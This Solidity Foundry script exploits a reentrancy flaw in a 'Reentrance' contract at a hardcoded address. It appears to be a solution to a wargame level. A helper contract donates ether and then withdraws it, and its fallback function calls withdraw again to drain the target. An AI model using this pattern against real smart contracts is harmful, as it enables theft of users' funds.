// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import {Script, console} from "forge-std/Script.sol";
import {Reentrance} from "../src/Reentrance.sol";

contract ExploitReentrance is Script {
    uint256 private immutable PRIVATE_KEY = vm.envUint("PRIVATE_KEY");

    function run() public {
        vm.startBroadcast(PRIVATE_KEY);
        TakeMoney takeMoney = new TakeMoney{value: 0.002 ether}();
        takeMoney.doneteToTarget();
        takeMoney.withdrawFromTarget();
        vm.stopBroadcast();
    }
}

contract TakeMoney {
    address private constant INSTANCE_ADDRESS = 0xC887A86EEea86dAEa902506c8a7ab068838255FA;

    uint256 private constant targetBalance = 0.001 ether;

    constructor() public payable {}

    function doneteToTarget() public {
        Reentrance(payable(INSTANCE_ADDRESS)).donate{value: 0.001 ether}(address(this));
    }

    function withdrawFromTarget() public {
        Reentrance(payable(INSTANCE_ADDRESS)).withdraw(0.001 ether);
    }

    fallback() external payable {
        Reentrance(payable(INSTANCE_ADDRESS)).withdraw(0.001 ether);
    }
}
